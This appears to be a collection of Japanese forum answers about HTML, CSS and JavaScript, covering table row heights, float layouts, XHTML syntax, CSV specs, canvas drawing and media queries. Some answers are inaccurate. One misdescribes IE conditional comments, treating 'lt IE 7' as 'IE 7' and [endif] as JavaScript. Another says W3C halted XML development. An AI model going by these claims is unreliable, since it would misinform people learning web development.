テーブルの行の高さ、なので <tr> タグに指定するのが素直でしょうか。 <style> table tr { height:1em; } /* 全ての行に適用 */ table tr.test { height:3em; } /* 特定の行のみ適用 */ </style> <table border> <tbody> <tr> <td> 1 <td> 2 <tr> <td> 3 <td> 4 <tr class=test> <td> 5 <td> 6 </table>
予め分かっている文字列なら、手動でクラスを追加する方法が確実です。 不規則な入力となるなら、jqueryの「txt.replace」を使って文字列を検知して置き換える方法があるかと。 以下はサンプルです。 <script type="text/javascript" src="jquery-1.9.1.js"></script> <script type="text/javascript"> $(function(){ $('a').each(function(){ var txt = $(this).html(); $(this).html( txt.replace(/下線あり/g,'<span>下線あり</span>') ); }); }); </script> <style type="text/css"> a {text-decoration:none;} a span {text-decoration:underline;} </style> <p><a href="index.html">下線あり</a></p> <p><a href="index.html">下線なし</a></p>
こんなあやふやなところで聞かずに、まず仕様書を確認する。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 15.2.2 フォント変更要素: FONT要素とBASEFONT要素 　ONT要素とBASEFONT要素は推奨しない。 　・・・【中略】・・・ 属性定義 　size = cdata [CN] 推奨しない。 　この属性は、フォントのサイズを設定する。可能な値は次の通り。 1.1から7までの整数。フォントのサイズを固定的に設定するものだが、そのレンダリングはユーザエージェント依存である。またすべてのユーザエージェントが7種類の大きさをレンダリングできるとは限らない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Alignment, font styles, and horizontal rules in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　1999年のHTML4.01の勧告以来15年、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 著者 　・・・【中略】・・・ 　HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　と言われてきて、私もここ10数年fontは使ったことありませんが・・・7段階しかない事は知っていました。・・・知らなくてよいです。(^^) 　HTML書くときは、strictで作成し、プレゼンテーションはスタイルシート使いましょう。
ちょっと遊んでみた・・640px×480pzの画像は用意してね。 ★HTML4.01strict+CSS2.1(一部CSS3を使用) ★タブは＿に置換してあるので戻す。 ★javascriptのスムーススクロール <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} div.nav{width:640px;height:510px;background:url(./images/5.jpg) no-repeat 0 30px;position:relative;z-index:100;} div.nav ol,div.nav ol li{margin:0;padding:0;list-style:none;position:absolute;} div.nav ol li a{display:block;width:100%;height:100%;overflow:hidden;text-indent:-100em;position:relative;top:-2px;left:-2px;z-index:-100;} div.nav ol li{width:80px;height:80px;top:20px;left:20px;} div.nav ol li+li{width:120px;height:120px;top:20px;left:480px;} div.nav ol li+li+li{width:80px;height:80px;top:380px;left:20px;} div.nav ol li+li+li+li{width:80px;height:80px;top:380px;left:500px;} /* 分かりやすいように色 */ div.nav ol,div.nav ol li{border:solid yellow 1px;} div.nav ol li a:target{border:2px solid red;background-color:rgba(255,255,0,0.2);z-index:100;} div.nav ol li a:target:after{content:"今は"attr(id);position:absolute;top:10px;left:101em;color:red;z-index:1000;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>本文はsection</p> ＿＿<div class="nav"> ＿＿＿<p><a href="#A1">スタート</a></p> ＿＿＿<ol> ＿＿＿＿<li><a href="#A2" id="A1">A1</a></li> ＿＿＿＿<li><a href="#A3" id="A2">A2</a></li> ＿＿＿＿<li><a href="#A4" id="A3">A3</a></li> ＿＿＿＿<li><a href="#A1" id="A4">A4</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
RFC4180をきちんと読めばわかるんですが RFC4180はCSVの仕様を規定しているわけではなく RFC4180が書かれたときに既に存在していた様々なCSVの仕様から最大公約数の内容が書かれているだけです。 http://www.7key.jp/rfc/rfc4180.html#csv_format からの抜粋 >CSV形式の仕様と実装は多岐に渡る（7.2.参考文献[4]、[5]、[6]、[7]）が、多様な実装が解釈し得るCSV形式の公式な仕様はない。本節で、殆どの実装が解釈可能なCSV形式の書式を述べる。 カテゴリーもInformationalですから標準規格を規定したものではありませんし。 ゆえに#2の方がいわれているようにCSVの仕様自体がアプリケーション依存ですので、 サーバー側のプログラムがExcelの出力するCSVに対応していないのでしたら対応させるか、 別の手段でデータのやりとりをすることになるかと思います。
いいえ、XHTMLもXMLです。 　HTMLを、SGMLの子孫であるXMLの文法にあわせたものがXHTMLで、それもXMLです。 　HTMLは、SGMLを参考に作られましたが、SGMLでもXMLでもありません。 XMLは、すべての要素は<element attriblue="">内容</element>になります。要素名,属性名は小文字、すべての要素はかならず開始タグと終了タグで、その内容を括らなければなりません。内容のない要素は、<element attriblue="" />とすることもできます。属性値はかならず""で括らなければなりません。 HTMLは、 ・要素名・属性名が大文字でも良いです。 ・属性の値が一つの場合でascii文字だけのときは""で括らなくても良い 　値だけ書けば良い属性もあります。<option selected> ・内容のない要素は終了タグが不要　<br><img><link> と随分と簡単になっています。 <link rel="apple-touch-icon-precomposed" href="[URL]"> はHTMLとしては正しいのですが、XMLでは解析エラーですので <link rel="apple-touch-icon-precomposed" href="[URL]"></link> または、 <link rel="apple-touch-icon-precomposed" href="[URL]" /> としなければなりません。 　ところがブラウザによると、<link rel="apple-touch-icon-precomposed" href="[URL]"></link> 　は解釈できませんので、 <link rel="apple-touch-icon-precomposed" href="[URL]" /> 　が必然的に唯一の選択肢になります。 　⇒HTMLからXHTMLへ（基礎知識）( http://www.w-frontier.com/xhtml.html ) 　XHTML(Extensible HyperText Markup Language)は、文法に厳格ですが、完全なXMLその代わりすべてが統一された文法になっていますから機械処理が容易です。ブラウザへの負担が取っても少ない。その負担の軽減でHTML以外のXML要素を任意に加えることも可能です。 　しかし、文法が厳密になるため、人の側からすると扱うのが難しく。「HTMLは4.01で終了、今後はXHTML」とW3Cがいくら笛や太鼓を叩いても普及が進みませんでした。そしてブラウザベンダーは、独自に新しいHTML5を策定し始めた。 　結果的に、W3Cも「難しすぎる技術は普及しない」と認めて、XMLの開発は中止して、HTML5を進めることになった。 　⇒HTML5が持つ本当の意味 － ＠IT( http://www.atmarkit.co.jp/news/200801/25/html.html ) ★HTMLとXHTMLの違いは、XHTMLでページを作成するときは、必須の知識ですからしっかりと確実に身につけておきましょう。 　あちこちから、ソースだけをつまみ食いしてつぎはぎしても、応用は利きません。理系科目の勉強と同じです。基礎からコツコツと積み上げていくほうが、はるかに簡単で楽で応用が利きますよ。
HTMLは <!-- コメント--> CSSは /* コメント */ それぞれにしか使えないと思います。
No.1です。 昨日は携帯からだったので失礼しました。 XUVJORSLPDTZXさんがどこまで知識があるかわからないので、知識の無い方向けにできるだけ噛み砕いて書いてますが、回りくどかったらごめんなさい。 ある程度知識のある方ならNo.2さんの解説が非常に細やかなので、勉強されるにはそちらを参考にしたほうがいいと思います。 ■まずは手っ取り早く結論から。 ●htmlには以下の通り（昨日とちょっと変えてます）。 -------- <div class="clearfix"> <div class="floatL">左</div> <div class="floatR">右</div> </div> -------- ●cssは<head>～</head>に直に記述するか、もしくは別のファイル（△△.css）にして、ヘッド内で読み込みます。 <head>～</head>に直に記述する場合は以下の通り。 -------- <style type="text/css"> <!-- .clearfix:after { content: "."; display: block; height: 0; clear: both; visibility: hidden; } .clearfix { display: inline-table; } /* Hides from IE-mac \*/ * html .clearfix { height: 1%; } .clearfix { display: block; } /* End hide from IE-mac */ .floatL {float:left;} .floatR {float:right;} --> </style> -------- 別のファイルにして、ヘッド内で読み込む場合は 別ファイルに -------- .clearfix:after { ～（中略） .floatR {float:right;} -------- <head>～</head>に -------- <link href="△△.css" rel="stylesheet" type="text/css" /> -------- △△.cssはお好きな名前にして、このhtmlからみたパスを正しく記入してください。 ■ここから下はカンタンな解説です。 最初のコード <a href="http://www.yahoo.co.jp/">左</a> <div align="right"><a href="http://www.yahoo.co.jp/">右</a></div> ここで使われている<div align="right">の「div」はブロックレベル要素といって、見出し、段落など文書を構成する基本要素となるものです。これは【かたまり】の扱いなので、何も指定しないと図の紫や赤の線のように親要素に100％の幅（この場合ウインドウいっぱい）に表示されます。 目には見えなくても幅100％の箱を置いたようなもの、と理解してください。 なので図の上半分のように、「左」の下に幅100％の箱があり、その中に「右」があるので、同じ行にならないのです。 このブロックレベル要素に、cssでfloatを指定してやると、中身の幅に合わせたサイズで左寄せ、右寄せにすることができます。 今回は左のボックスにfloatL（ 水色の線）、右のボックスにfloatR （緑の線）というクラスを指定しました。 これでご要望の配置にすることはできましたが、そのままだとこの下の文章が「左」と「右」の間に流れ込んでしまいます。 そこでこの二つをもうひとつのdivでくくり、clearfixというクラスを指定して、floatを解除しました。 clearfixにはいろんな書き方があって、今回のはその一例です。 こういう場で書かれた解答をそのまま真似して終わるより、カンタンにでもその理屈を理解したほうがその後の役に立つと思います。 私の解説はザックリ過ぎですから、きちんと勉強されるならNo.2さんの解説などを参考にされてください。
DOCTYPEと文法があっているか？？ Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) で確認 ＞スマホサイトを制作中なのですが、 　スマホもmediaはscreenです。他のPCがあるのでしたら共通で良いです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　同じ内容の複数のページを作ることだけはないように。SEO上問題になります。 　リキッドにして、それでカバーできないときはmediaquery使えばよい。膨大な種類のスマホ、フィーチャーホン、PCがあるし今後も増え続けますのでね。
＞入力項目に入力させずに、複数div内のテキストとかを送信し、POSTで受け取りたいです。 それだけでは分かりません。 　そのテキストは、どうして作成されているのですか？？？。その補足の内容からは、動的にページが作成されているのじゃないかと。 　もしそうであるなら、それを出力する段階でhiddenに入れて別途テキストを記述するか、textareaに記述してdisabled属性をつけて変更できなくしてスタイルシートで枠を消すなどすれば良い。もし静的な物でしたら、同様に記述しておけばよい。
> sample.comは大丈夫とのことでしたが 誤) sample 正) example 間違いやすいで注意しましょう 根拠 http://suika.fam.cx/rfc/ja-translations/rfc2606- … 3. 予約例示第二位ドメイン名
　社内で同じネットワーク上で同じ(MUA Mail User Agent)を使ってなら出来なくもないですが、それでもsendmail、qmailなどメールサーバー(MTA Mail Transfar Agent)は最低限必要です。 　⇒Sendmail - Wikipedia( http://ja.wikipedia.org/wiki/Sendmail ) 　⇒qmail - Wikipedia( http://ja.wikipedia.org/wiki/Qmail ) いずれも、UNIX系のOS対象ですから、ネットワーク上にWindowsしかなければ 　⇒Microsoft Exchange Server - Wikipedia( http://ja.wikipedia.org/wiki/Microsoft_Exchange_ … ) を利用することになります。 　しかし、MTAを用意するのでしたら、ついでにPerlなどもインストールしてCGIを組むべきです。そうすると、OSの違いやMUAの違いを気にしなくて良くなります。
こんな感じでJavaScriptでiframeのsrcを順番に書き換えていけばいいのではないでしょうか。 <script> var ifid = 0; var ifurl = [ "http://www.yahoo.co.jp/", "http://www.watch.impress.co.jp/", "http://www.excite.co.jp/" ]; function ifchange() { document.getElementById("iframe1").src = ifurl[ifid]; ifid++; if (ifid >= ifurl.length) { ifid = 0; } } </script> <button onclick="ifchange();">ぼたん</button> <iframe id="iframe1" style="width:200px; height:100px;"></iframe>
やりようはありますが、漠然とした質問にはぼんやりした回答しかできません。 具体にはjavascriptを使う、リダイレクトをつかう、シンボリックリンクを使う、cronを使う、プッシュを使う、フィードをつかう、XMLを… どの方法が使えるか、実装しやすいかは、状況によるので一般論で答えることはできません。もしどうしても知りたい場合はblogのアドレスを公開してください。。
さすがに分からん。 今まで機能していた。のなら、その時点から現段階のどこかで間違いがあるんでしょう。 少しずつ戻して、どこでミスしたのか確認しましょう。
No.2です。 補足の ＞私が読んだ記事では、「将来、WEBページにHTMLが使われているかどうかも分からないのに、拡張子を『html』にすることは望ましくない。」という様な内容でした。 ＞「なぜなら、将来、htmlから、他のファイルタイプにWEBページを変更することになった際に、URLに含まれる『.html』部分を変更する必要が生じ、 　あなたが読み間違えているか、その本が大出鱈目・・・ ★他のファイルタイプにWEBページを変更することになった際に、URLに含まれる『.html』部分を変更する必要が生じ 　それは拡張子だけの問題ではなく、他のファイル名に変える必要が出たって同じでしょ。 　Windowsに汚染されていると、拡張子を特別扱いしてしまいますが、拡張子もファイル名の一部に過ぎません。sample.tr.gz とか、あるいは拡張子がないファイルとか、ネットに存在するファイルは実に様々です。ブラウザがそれをHTMLと認識できるのは、サーバーから送られてくるHTTP応答ヘッダにContent-type:text/html となっているからだけですよ。たとえ拡張子が.cgiだろうが、htmlだろうが、応答ヘッダがContent-type:image/jpeg でしたらjpeg画像として処理されますよ。 　例えば、 Enviroment Variable and FORM,COOKIE( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/kon77 … )とか好きなのつけてアクセスしてご覧なさい。 　応答ヘッダはtext/html なのでHTMLとして表示される。 　HTMLは 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから どのバージョンのHTMLも、コンテンツプロバイダの投資が無駄にならないよう、また短期間で文書が読み取り不能となったりすることがないよう、産業界の幅広い賛同を反映するようにされてきた。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ですし、ルーツはSGMLです。SGMLは 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ただし、軍艦や軍用機などは数十年という長期間の保有が必要になるため、長期間にわたりデータが利用可能とならなければならない。電子文書は特定の企業のワープロソフトを用いるとそのソフトのバージョンが上がったり、最悪の場合そのソフトを開発している会社が開発を中止したり、倒産したりしてソフトウェアが無くなった場合は、今まで作成したデータが読めなくなるという問題が発生してしまう。そこで、プレーンテキストのみを用いて、「タグ」を使うことによってデータに意味を持たせることが考えられた。 このようにして規格化されたのがSGMLであった。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Standard Generalized Markup Language - Wikipedia( http://ja.wikipedia.org/wiki/Standard_Generalize … )］より 　ですので、未来永劫HTMLがなくなる事はありえません。もしそんなことになったら、世界中にある何兆とも言われるHTMLが利用できなくなる。それをしないためのHTMLですので・・その本の説明が正しいとしたら、荒唐無稽としか言いようがない。 　
arcは、パスを指定して描画するものなので、beginPathしてから描画した後にclosePathし、それからfillなどの描画メソッドを呼び出す形になると思います。こんな感じ。 if (canvas.getContext) { var ctx = canvas.getContext('2d'); ctx.beginPath(); ctx.arc(180,150,20,Math.PI*1,Math.PI*2,true); ctx.closePath(); ctx.fill(); // ここで描画 }
フォーカスについてちょっと調べてみたのですが、 http://msdn.microsoft.com/en-us/library/ie/ms534 …(v=vs.85).aspx MSDNによると、<a>要素は「focus可能」と「tabStop可能」の２つのプロパティを持ち、「<a>はデフォルトで両方がyes」になっています。 MDNでは言及されていないようです。 Webkitはどこに書かれているのかわかりません。。。 http://trac.webkit.org/wiki W3Cのドキュメントにも、<a>や<input>などをクリック操作、タブキー操作したときのデフォルト動作として、focusについての言及はないようです。 http://www.w3.org/TR/1999/REC-html401-19991224/i … 推測ですが、Webkitのみ「<a>はデフォルトでfocus可能要素であり、クリックではfocusしないがtabキーでfocus可能」となっていて、 Webkit以外が、「<a>はデフォルトでfocus可能要素であり、クリックでもtabキーでもfocus可能」となっているようです。 <input>は全てのブラウザで、デフォルトでfocus可能要素であり、クリックでもtabキーでもfocus可能となっているようでした。 W3Cの言語仕様にも書かれていないため対処療法（今後のブラウザアップデートで動作が変わる可能性がある）となりますが、tabindexを指定してみてください。 この方法なら、JavaScriptではなくHTMLで指定できるようです。 <a href="#" tabindex="0"> tabstopの操作を指示する物ですが、多くのブラウザがtabstopとfocusを連動しているようです。 また、webkitに関しては、<a>をクリックをした時のフォーカス処理をどう扱うかが変わるようです。 tabindexを0にすると、HTMLに書かれている順番通りにtabstopの順番が決定されます。（tabstopの動作はtabindexを書かない時と同じままで、focusの動作のみが変わる。） =============== 検証 <a href="#" tabindex="0">anchor-0</a> <a href="#" tabindex="0">anchor-1</a> <a href="#">anchor-2</a> <a href="#">anchor-3</a> <a href="#">anchor-4</a> anchor-1をクリックしてtabキーを押すとanchor-2がフォーカスされるので、anchor-1のクリックによりanchor-1にフォーカスが当たった事が確認できます。 しかし、anchor-3をクリックしてtabキーを押すとanchor-0がフォーカスされるので、anchor-3のクリックではanchor-3にフォーカスが当たっていない（全ての要素からフォーカスが外れる）ことが確認できます。 スタイルシートで a:focus{} を指定しておけば、フォーカスに合わせてスタイルが適用されることも確認できます。 ----------- Netscape、Gecko（Firefox）、Trident（IE）、Presto（旧Opera）、フィーチャーフォンなどの動作から考えれば、Webkitだけが特殊だと思いますけどね。 （全てのブラウザが異なる仕様のもとで動作しているそれぞれに正しい動作です。）
＞フィーチャーフォン 　も同様です。一応フルブラウザですので、 @media handheld{} 　にするか、外部スタイルシートを使えると考えてよいなら <link rel="stylesheet" type="text/css" href="./styleSheet/default.css"> <link rel="stylesheet" type="text/css" media="screen" href="./styleSheet/screen.css"> <link rel="styleSheet" type="text/css" media="handheld" href="./styleSheet/handheld.css"> <link rel="styleSheet" type="text/css" media="print" href="./styleSheet/print.css"> とかで振り分ければよい。 スマホ用にmediaqueryを追加してもよいかと 基本に率直に従えば、最近のフィーチャーホンでしたら悩まなくても良いですよ。 　古い・・・ガラケーも含めるとなるとtransitinalとかが必要になるでしょう。
CSSだけでは無理ですね。 JavaScriptを併用すればできます。 <style> a { font-weight: normal; background-color: white; } a:target { font-weight: bold; background-color: red; } </style> <a id="test1" href="test1.htm" target="targetframe" onclick="location.hash=this.id">test1</a> <a id="test2" href="test2.htm" target="targetframe" onclick="location.hash=this.id">test2</a> メジャーなブラウザの最新版で行けると思います。 ------------------- ラジオボタンと組み合わせればCSSだけでいけるかと思ったけど無理でした。 <label><input><a>inputに影響しないʅ(╯⊙ ⊱⊙╰ )ʃ</a></label> <a>を使わなければラジオボタンのチェックが入りますが、ページの移動にJavaScriptを使う事になります。 ラジオボタンをクリックしてから<a>をクリックするので良ければ、以下で。 <style> /* input[type=radio] { position:absolute;left:-10000px; } */ input[type=radio]:checked + a { font-weight: bold; background-color: red; } </style> <label><input type="radio" name="r1"><a href="test2.htm" target="targetframe">test2</a></label> <label><input type="radio" name="r1"><a href="test2.htm" target="targetframe">test2</a></label>
あまり、詳しくはないのですが、知っている範囲で、書きます。 <!DOCTYPE html> は、このブラウザのテキストのタイプは　「html」ですと宣言しています。 <!--[if lt IE 7]> 　　　 <!-- で始まり 　　　--> で閉じで使います。 この中に書かれているのは、該当ソースの覚書メモのようなもので、ブラウザ上には表示されません 上の場合は「if lt IE 7」となっているので、ブラウザがIEつまり（インターネットエクスプローラ）が7のバージョンの時にはという意味合いです。 例の場合はIEが７のバージョンの時は「html classにあるコードを参照。[endif]というのはjava script の構文でこれで終わりの意味です。 htmlに、cssのコードを入れるとき、IEのバージョンによって、表示が異なるので、それぞれを表記してあげる必要があります。 コードの順番を間違うと、文字化けしたり、きれいに表示されなかったりすることになります。 ブラウザがいろいろ増えてバージョンも増えてきて、CSSは、一つずつについて書く必要があるので、こういう長いものになっています。 参考URL：http://www.htmq.com/csskihon/001.shtml
＞以前ここで3カラム左右可変をやり方を教えていただいたのですが、うまく出来なかったので 　私には記憶ないのですが。 　当初のこちら（左右固定の３カラム）で・・初心貫徹 ＞HTML5(大文字)で作りたいが、JSだと重いのでHTML4.01ということ？ 　video要素やSVGを使わず単に、header,sectionのような新しい要素だけでしたら重くはありません。問題にするとしたらjavascriptが無効なときだけでしょう。 　HTML5を使わずHTML4.01を使用するのは、 ・後方互換（古いブラウザへの対応も考慮しなければならない）のときです。だとしたら@media screen andのようなCSS3を用いるのは矛盾します。 　しかも、. header{}とか、#なんとか{}など、CSS1のものがそのままだったり 「HTML5は未勧告で確定していないことや後方互換を考えてHTML4.01+CSS2.1で製作する」 という条件で説明します。ちょっと厳しいかもしれませんが、あなたのためになると思って書きます。 　残念ながら、基本がまったく出来ていません。HTML4.01+CSS2.1を使われるならまず両方の仕様書だけはかならず目を通してください。すべてを一度に理解するのは無理ですし無駄ですが、すくなくともどこに何が書いてあるくらいは知っておくこと。 ・HTML 4.01 仕様書邦訳( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・CSS 2.1仕様（日本語訳）( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　ここからはリンク先も見ながら読み進めること 　最も重要な事は「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」です。HTMLには文書構造しか書かずにプレゼンテーション(表現)はスタイルシートに任せるという事です。そのためにスタイルシートを使うのです。 　→14.1 スタイルシートの概説( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 1) まず、デザインは一切考えずに文書構造だけをマークアップします。HTML4.01ではHTML5のような文書構造を示す要素がありませんからDIVやSPANを使います。 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　それ以外の目的(主にデザイン)で使用したり、文書構造としては意味不明のclass名(clear_fixとか・・)やidつけたり。 　HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … )のページの真ん中あたり「【問題2】文書内に埋め込まれた「意味」が不明確」 　HTML5ではこの問題を解決するために新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )が追加されます。 　 HTMLの<body>内 <body> 　<div class="header"> 　　<h1>ページタイトル</h1> 　</div> 　<div class="section"> 　　<h2>本文</h2> 　　<p>本文記事</p> 　　<div class="nav"> 　　　<h3>ナビゲーション</h3> 　　　<p>画像がコンテンツの主要な要素でない場合は背景にします。</p> 　　</div> 　　<div class="aside"> 　　　<h3>補足記事</h3> 　　　<p>本文とは直接関係ない--asideな--記事</p> 　　</div> 　</div> 　<div class="footer"> 　　<h2>文書情報</h2> 　</div> </body> 　というHTMLをまず書きます。デザイン考えてないのでメンテナンス楽ですね。 　HTML5だと、それぞれ、<header><header><section></section><aside></aside><nav></nav><footer></footer>になります。用途もあわせてあるので、将来HTML5にするときは、そのまま書き換えればよい。 　当初の予定通りスタイルシートを書いていきます。 html,body{margin:0;padding:0;}/* 余白消しておく */ h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{ width:100%;/* ウィンドウ幅に合わせる。 */ min-width:630px;max-width:1000px;/* 最小(スマホ)、最大(幅広ディスプレイ) */ margin:0 auto;/* 幅がウィンドウ幅より狭いときは中央 */ padding:5px;/* ボックス内の余白 */ } div.section{ position:relative;/* 子孫要素の基準とするため */ min-height:400px;/* 一応目次(nav)や補足記事(aside)のための最小高さ */ } div.section>*{ margin:0 100px;/* navとasideのスペース */ } div.section div.nav,div.section div.aside{/* 本文内のこれらは */ position:absolute;/* 絶対配置、staticでない直近の親を基準 */ top:0; width:100px;/* 幅を指定 */ height:100%;/* 本文高さ一杯 */ margin:0; } div.section div.nav{ left:0; } div.section div.aside{ right:0; } /* 分かりやすいように色分け */ div.header{background-color:aqua;} div.section{background-color:silver;} div.nav{background-color:lime;} div.aside{background-color:white;} div.footer{background-color:fuchsia;} たったこれだけです。 ★セレクタはかならず基点となるセレクタ書きましょう。 　『単体セレクタは型セレクタもしくは 全称セレクタのいずれかの直後に、( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )』 ★class名に日本語は使えません。 　セレクタに使用できる文字はアルファベット、数字、ハイフン(-)、アンダースコア(_)が使用可能で1文字目にはハイフンと数字は使用できません。 ★mediaqueryを使うのは、あくまでリキッドでデザインしてそれ以上の対応をしたいときです。 　よって /* 必要なら小さい画面用に下記を追加 */ @media screen and (max-width: 640px) { div.section{ min-width:0; min-height:0; } div.section div.nav,div.section div.aside{ position:static; display:inline-block; width:48%; } div.section>*{ margin:0; } } @media screen and (max-width: 480px) { div.section div.nav,div.section div.aside{ position:static; display:block; width:100%; } }
postmail.cgiというのが http://www.kent-web.com/mail/postmail.html これであれば、 http://www.kent-web.com/pubc/kitei.html 「Powered by」という言葉の代わりに「copyright」という言葉を入れなければなりません。 お金を出す代わりに広告をして利用者に宣伝するわけですから、 著作権表記も広告表示もしたくなければ、一番早いのは業者にお金を出して作ってもらう事です。 https://support.google.com/docs/answer/87809?hl=ja Googledocsでフォームを作ってみてはいかがでしょうか。 URLがgoogleになると思いますのでgoogleを利用している事がわかりますが、ページ内にはgoogleの著作権表記も他社の広告も入らないと思います。 （Google Adsenceが入るかもしれませんが、確認してください。） Googleのサービスは基本的にアクセスデータをサービス利用の対価としていますので、誰か（何か）を宣伝しなくていいです。
原則として一部だけと言うことはできません。あくまでディレクトリ単位での設定になります。スマートフォン用にもうひとつディレクトリを作る。 　ただ、『新たにスマートフォン用のページを作成しました。』これは根本か間違っています。HTMLを使ってウェブページを作成する理由は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　別のページを作成することを避けるためにHTMLでページを作成するのですよ。 　そもそも、膨大なユーザーエージェントごとにページを作成するのも、.htaccessを書き換え続けるのも現実的ではありません。 　私は、 media="screen" : スマホやPC用のもの。リキッド 　必要な場合はmediaqueryでスマホ用スタイルを指定。スマホを縦横かえても切り替わる。 media="print" 　screen用のスタイルは適用されないので、ブラウザのもつスタイルで印刷 　必要な場合は印刷用スタイルを用意しておく 程度は指定して、ひとつのページだけ作っています。スマホでは利用できないページは、mediaqueryでそのページへのリンクを隠しています。 お勧めではないが.htaccessによる振り分けは 　⇒ユーザーエージェントによってPCとスマートフォン（iPhone / Android）を振り分ける方法いろいろ（PHP / JavaScript / .htaccess等） ｜ HTML5 – CSS3 mag( http://html5-css3.jp/smartphone/pc-iphone-androi … ) 　などに説明があります。
thに関して text-align:left; font-weight:normal; で、tdとまったく同じになります。 きになること。 「単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「・ページレイアウトの目的で表を用いる。 　　　・・・【中略】・・・ 　　こうしたテクニックによって、Webページはより複雑化し、限られた環境にしか適応しなくなり、相互運用性問題に悩まされることとなり、障害を持つ人々にアクセス障壁が設けられてしまう。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　とHTML4.01の勧告(1999)以来、とても強くデザイン目的でtableを使用する事は強く非推奨です。もしth（表の見出しセル）は、そうでないセルと区別するために、font-weightやtext-alignの指定は変更しないほうがよいはずです。 　⇒TH要素は、見出し情報を含むコマを定める。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
Documentwriteで書き出してしまえばよいのでは？？ あとはスタイルシート側の問題です。
http://html-coding.co.jp/knowhow/tips/000572/ こちらに色々記載されてますので試してみてください。
